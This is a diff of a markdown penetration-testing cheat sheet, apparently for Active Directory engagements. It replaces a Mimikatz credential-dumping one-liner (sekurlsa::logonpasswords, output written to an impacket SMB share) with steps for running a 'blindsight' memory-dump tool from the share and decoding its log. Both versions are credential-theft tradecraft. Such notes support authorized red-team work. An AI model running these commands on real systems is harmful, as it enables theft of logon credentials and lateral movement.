@@ -909,16 +909,26 @@ u.objectid ENDS WITH "-548" RETURN q
 </details> 
 
 <details>
-  <summary> Run Mimikatz from impackets smb share </summary> 
+  <summary> Run blindsigt from impackets smb share </summary> 
 
   ### Starting a SMB Server
   ```shell
   impacket-smbserver.py <shareName> <sharePath>
   ```
   
-  ### Run Mimikatz from host and write output to the share
+  ### Run blindsight from host 
   ```shell
-  \\<target_IP>\<shareName>\mimikatz.exe "privilege::debug: sekurlsa::logonpasswords exit" > \\<target_IP>\<shareName>\output.txt
+  \\<target_IP>\<shareName>\blindsight.exe
+  ```
+
+  ### Retrieve the file
+  ```shell
+  lget <output>.log
+  ```
+
+  ### Unscramble memory dump:
+  ```shell
+  blindsight.exe <output>.log
   ```
   
 </details> 
